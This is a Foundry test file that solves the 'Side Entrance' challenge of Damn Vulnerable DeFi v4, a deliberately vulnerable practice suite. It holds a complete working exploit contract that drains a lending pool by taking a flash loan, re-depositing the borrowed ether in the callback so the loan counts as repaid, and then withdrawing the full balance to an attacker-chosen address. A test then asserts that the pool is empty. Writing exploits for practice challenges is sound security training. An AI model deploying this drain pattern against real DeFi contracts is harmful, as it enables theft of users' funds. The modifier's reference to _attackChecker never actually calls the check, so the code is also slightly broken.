// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {
    SideEntranceLenderPool,
    IFlashLoanEtherReceiver
} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract Attacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    address recovery;
    bool public called;

    constructor(address _pool, address _recovery) {
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();

        (bool success, ) = address(recovery).call{value: address(this).balance}(
            ""
        );
        require(success, "withdraw failed");
    }

    function execute() external payable {
        called = true;
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}

contract TryingdrainContract is Test {
    address deployer = makeAddr("deployer");
    address attackera = makeAddr("attacker");
    address recovery = makeAddr("recovery");

    SideEntranceLenderPool pool;

    uint256 constant ETHER_CONTRACT_POOL = 2550 ether;
    uint256 constant ATTACKER_POOL = 1 ether;

    modifier StartAttacker() {
        vm.startPrank(attackera, attackera);
        _;
        vm.stopPrank();
        _attackChecker;
    }

    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_CONTRACT_POOL}();
        vm.deal(attackera, ATTACKER_POOL);
        vm.stopPrank();
    }

    function test_initial_states_before_attack() public view {
        assertEq(address(pool).balance, ETHER_CONTRACT_POOL);
        assertEq(address(attackera).balance, ATTACKER_POOL);
    }

    function test_is_SideEntrance_vulnerable() public StartAttacker {
        Attacker attacker = new Attacker(address(pool), recovery);

        attacker.attack();

        console.log(
            "address pool after attack = ",
            address(pool).balance / 1 ether
        );

        assertEq(address(pool).balance, 0);
    }

    function _attackChecker() private view {
        assertEq(address(pool).balance, 0, "pool steel having funds");

        assertEq(address(recovery).balance, ETHER_CONTRACT_POOL);
    }
}
